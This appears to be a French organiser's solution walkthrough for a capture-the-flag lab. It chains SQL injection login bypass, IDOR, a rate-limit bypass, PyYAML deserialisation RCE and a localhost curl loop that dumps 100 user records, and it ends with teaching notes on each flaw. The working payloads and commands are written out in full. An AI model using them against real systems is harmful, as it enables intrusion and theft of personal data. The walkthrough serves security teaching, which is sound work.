# Walkthrough — ANTS-Lab

> ⚠️ Solution complète. **Ne pas distribuer aux joueurs.**

**Objectif** : exfiltrer l'intégralité des 100 dossiers usagers de la base de données.

---

## Étape 1 — Reconnaissance

Le joueur arrive sur `http://target:8080`. La page d'accueil mentionne :
- Un espace personnel (`/login`)
- Une fonctionnalité d'import au format YAML
- Des protections anti-bot actives sur les espaces personnels

---

## Étape 2 — SQL Injection (auth bypass)

Sur `/login`, on injecte dans le champ identifiant :

```
Identifiant : admin' --
Mot de passe : x
```

La requête SQL construite côté serveur devient :

```sql
SELECT id, username, role FROM users WHERE username='admin' --' AND password='x'
```

Le `--` commente la fin de la condition. La requête renvoie l'utilisateur `admin`,
qui est instancié dans la session Flask. Redirection vers `/dossier`.

**Pourquoi ça marche** : le service `db-api` expose un endpoint `/legacy_query` qui
exécute du SQL brut. L'application web construit la requête par concaténation de
chaînes et l'envoie à cet endpoint sans aucune préparation.

---

## Étape 3 — IDOR et découverte du rate limiting

Une fois connecté, l'URL devient `/dossier`. On observe le paramètre :

```
http://target:8080/dossier?user_id=2
```

Modifier `user_id` permet de consulter n'importe quel dossier. Mais après 5 requêtes
en 60 secondes, le serveur renvoie un HTTP 429 avec le message :

> *Notre système de protection anti-énumération a détecté un volume anormal de
> requêtes depuis votre adresse IP. Cette protection ne s'applique pas aux requêtes
> provenant du réseau interne.*

Cette dernière phrase est l'indice clé : **le rate limit ne s'applique pas à 127.0.0.1**.

### Faux indice à éviter

Le footer du dossier affiche `IP détectée : <X-Forwarded-For ou IP réelle>`. Tenter
de spoofer ce header :

```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://target:8080/dossier?user_id=2
```

ne fonctionne pas pour bypass le rate limit. Le serveur lit l'IP TCP réelle
(`request.remote_addr`) pour le check de whitelist, le header n'est utilisé que
pour l'affichage. Il faut donc émettre la requête **réellement depuis le serveur
lui-même**.

---

## Étape 4 — RCE via PyYAML

La page `/import` accepte un fichier YAML pour "migrer un ancien dossier". Le
serveur fait `yaml.load(file, Loader=yaml.Loader)` sans utiliser `SafeLoader`,
ce qui permet l'instanciation arbitraire d'objets Python via les tags
`!!python/object/...`.

On crée `test_rce.yaml` :

```yaml
!!python/object/apply:subprocess.check_output [["id"]]
```

Upload sur `/import`. La section "Aperçu des données importées" affiche :

```
uid=0(root) gid=0(root) groups=0(root)
```

La RCE est confirmée.

---

## Étape 5 — Récupération du cookie de session

Pour pivoter, il faut requêter `/dossier` depuis le conteneur avec un cookie valide.
Le cookie de session Flask est `HttpOnly`, donc invisible via `document.cookie`. Il
faut passer par les DevTools du navigateur :

1. F12 → onglet **Stockage**
2. Déplier **Cookies** → cliquer sur `http://localhost:8080`
3. Copier la valeur du cookie `session` (commence par `.eJy...`)

---

## Étape 6 — Dump complet via pivot localhost

On crée `dump.yaml` avec le cookie copié à l'étape précédente :

```yaml
!!python/object/apply:subprocess.check_output
  - ["bash", "-c", "for i in $(seq 1 100); do curl -s -b 'session=COLLE_TON_COOKIE_ICI' http://127.0.0.1:5000/dossier?user_id=$i; echo ---SEPARATEUR---; done"]
```

Upload sur `/import`. La sortie contient le HTML des 100 pages dossier, séparées
par `---SEPARATEUR---`.

**Pourquoi ça marche** : la requête `curl` est émise depuis l'intérieur du conteneur
web vers `127.0.0.1:5000`, donc `request.remote_addr` côté Flask vaut `127.0.0.1`,
qui est whitelisté dans le décorateur `rate_limit`. Aucune limite de débit n'est
appliquée, les 100 dossiers sont récupérés en une seule requête d'upload.

---

## Étape 7 — Extraction des données

La sortie est du HTML brut. Pour ne garder que les données utiles, on raffine le
payload en ajoutant un parsing minimal :

```yaml
!!python/object/apply:subprocess.check_output
  - ["bash", "-c", "for i in $(seq 1 100); do echo === USER $i ===; curl -s -b 'session=COLLE_TON_COOKIE_ICI' http://127.0.0.1:5000/dossier?user_id=$i | sed -n 's/.*<div[^>]*>\\([^<]*\\)<\\/div>.*/\\1/p' | grep -v '^$'; done"]
```

Le `sed` extrait les contenus `<div>...</div>` et `grep -v '^$'` filtre les
lignes vides.

Pour un dump structuré, le joueur peut aussi copier la sortie HTML dans un script
local et la parser proprement avec BeautifulSoup ou un simple regex.

---

## Résumé de la chaîne

```
┌─────────────┐   SQLi    ┌──────────────┐   IDOR    ┌────────────┐
│   /login    │ ────────► │  /dossier    │ ────────► │   429      │
│ admin' --   │           │ ?user_id=N   │  > 5 req  │ rate limit │
└─────────────┘           └──────────────┘           └────────────┘
                                                            │
                                                            ▼
                          ┌──────────────────────────────────────┐
                          │ Indice : whitelist 127.0.0.1         │
                          │ X-Forwarded-File ne suffit pas       │
                          └──────────────────────────────────────┘
                                            │
                                            ▼
┌─────────────┐  RCE      ┌──────────────┐  pivot     ┌────────────┐
│  /import    │ ────────► │  shell root  │ ─────────► │  curl en   │
│ YAML unsafe │           │ dans le      │  localhost │  boucle    │
│             │           │ conteneur    │            │  → 100     │
└─────────────┘           └──────────────┘            │  dossiers  │
                                                      └────────────┘
```

---

## Notes pédagogiques

Chaque étape isole un concept de sécurité distinct :

1. **SQLi** : validation d'input côté serveur, requêtes paramétrées
2. **IDOR** : autorisation au niveau objet, pas seulement authentification
3. **Rate limiting** : modèle de menace réseau, où mesurer l'IP source
4. **Désérialisation non-safe** : danger des formats permettant l'exécution de code
5. **Pivot localhost** : compréhension des frontières de confiance internes

La force du challenge est dans l'**enchaînement** : chaque vulnérabilité prise
isolément est classique, mais leur composition reflète un scénario d'attaque
réaliste où chaque faille seule ne suffit pas à atteindre l'objectif.
